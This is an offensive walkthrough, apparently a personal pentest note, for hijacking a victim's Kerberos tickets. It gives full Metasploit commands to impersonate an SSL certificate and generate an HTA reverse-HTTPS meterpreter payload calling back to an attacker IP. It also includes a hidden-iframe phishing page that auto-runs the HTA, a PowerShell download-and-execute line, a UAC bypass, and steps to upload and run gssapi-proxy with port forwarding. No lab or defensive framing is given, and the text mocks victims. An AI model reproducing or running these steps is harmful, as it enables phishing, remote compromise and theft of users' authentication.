# Hijacking Kerberose Tickets
> Jacking kerberos tickets to remotely access the intranet.
> The note describes a process that is run from Kali

1. Attacker creates a web page seving a malicous HTA file
2. Target browses the attacker-sent web page & executes the served HTA file
3. Meterpreter session is established
4. Malicous Code Injection
	- A: PowerShell script for recon against browser is injected into the target workstation's memory.  *We are looking for **intranet** locations that would include **Kerberos authentication**.*
	- B: gssapu-proxy is dropped and executed.  The attacker can connect to port 8080 & browse the intranet, hijacking the target's active Kerberose tickets.


## 1. Malicous HTA File

1. Craft Malicious HTA File

```bash
service postgressql start
msfconsole

# MSF

msf5 use auxilary/gather/impersonate_ssl
msf5 auxilary(mpersonste_ssl)> set RHOST www.google.com
msf5 auxilary(mpersonste_ssl)> run
```

The output of *run* will include a `[+] www.google.com:443 - pem: /location/to/pem.pem`.

```bash
# MSF
msf5 auxilary(mpersonste_ssl)> use payload/windows/meterpreter/reverse_https
msf5 payload(windows/meterpreter/reverse_https)> set LHOST [evil external IP]
msf5 payload(windows/meterpreter/reverse_https)> set LPORT 443
msf5 payload(windows/meterpreter/reverse_https)> set stagerverifysslcert true
msf5 payload(windows/meterpreter/reverse_https)> set HANDLERSSLCERT /location/to/pem.pem
msf5 payload(windows/meterpreter/reverse_https)> generate -f hta-psh -o /tmp/patch.hta  #See Note Below
msf5 payload(windows/meterpreter/reverse_https)> back
msf5 use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set LHOST [external OR internal IP depending on the setup]
msf5 exploit(multi/handler) > set LPORT 443
msf5 exploit(multi/handler) > set stagerverifysslcert  true
msf5 exploit(multi/handler) > set HANDLERSSLCERT /location/to/pem.pem
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > exploit -j
```

**generate** Note: This could throw an error depending on the version of MSF you are using.
Older versions of msf use slightly different option flags.  Check the options for your version.

This may work instead: `generate -t hta-psh -f /tmp/patch.hta`

The `-t` was for output *format* but in `msf5>` it is `-f`

The `-f` was for output *filename* but in `msf5>` it is `-o`


## 2. HTA File is Executed
**[+] Simple HTML page** to serve the HTA file just created.  Name it whatever but for here it will be refered to as `index.html`.

*Auto Execute* will only take place in IE and Edge browsers.

```html
<html>
<head>
<body>
<div style="display:none;">
	<iframe id="frmDld" src:"http://Ecorp.evil/patch.hta"></iframe>
</div>
</body>
</head>
</html>
```

1. Serve `index.html` via any means, but the below works just fine.  
```python
python -m SimpleHTTPServer 8080
```
2. Send the victim a link or some phish.
3. Victim goes to `http://Ecorp.evil/index.html` cause they aren't paying attention to the domain name.
4. When `index.html` loads IF browser is IE or Edge it will execute the `patch.hta` file, and if everthing was set up properly, connect back to the `msf` session.  Check `jobs` and `sessions` to see if it worked.
5. [maybe] The victim may need to allow the file to execute.  But why not? They cliked on a **`Ecorp.evil`** link, right?


## 3. Meterpreter Session

Now you should have a meterperter session.  If not, what did you do wrong? Seriously.... I laid everything out for you.

Interact with the session: `sessions -i 1`
Start a Shell: `merterpreeter > shell`


## 4. Malicous Code Injection

### 4.a Get browser history

Github location: [Get-BrowserData.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1)

To enumerate browser history & bookmarks, inject `Get-BrowserData` into the victim's memory.

Execute the following in the `shell` session started in #3 above.

```powershell
C:\Users\FrankCastle\> powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1'); Get-BrowserData | Format-List"
```
> Check the `Data` feild and look for intranet locations.  They usually require kerberos authentication.

### 4.b Inject gssapi-proxy

Github location: [gssapi-proxy](https://github.com/mikkolehtisalo/gssapi-proxy)

1. Elevate privilages
```bash
msf exploit(handler) > use exploit/windows/local/bypassuac_eventvwr
msf exploit(bypassuac_eventvwr)> set payload windows/mdterpreter/reverse_https
msf exploit(bypassuac_eventvwr)> set LHOST [evil external IP]
msf exploit(bypassuac_eventvwr)> set LPORT 4443 #Use different port than setup for the session.
msf exploit(bypassuac_eventvwr)> set stagerverifysslcert true
msf exploit(bypassuac_eventvwr)> set HANDLERSSLCERT /location/to/pem.pem
msf exploit(bypassuac_eventvwr)> set session 1
msf exploit(bypassuac_eventvwr)> run
```

**NOTE** Use different port than setup for the session.

Now you should be in a `meterpreter` session.  Time to upload **gssapi-proxy**.

```bash
meterpreter> upload /path/to/gssapi-proxy /windows/system/gassapi-proxy.exe
meterpreter> portfwd add -r victim.ip -l 4444 -p 8080
meterpreter> portfwd list
```

Point your attacking browser to the proxy you just setup.

Activate **gssapi-proxy**

```bash
meterpreter> shell

c:\Windows\system32>gssapi-proxy.exe

CRTL+C and drop out of the session [y]???

```

The user's active kerberos tickets is now hijacked and lets the attacker browse to the identified intranet locations.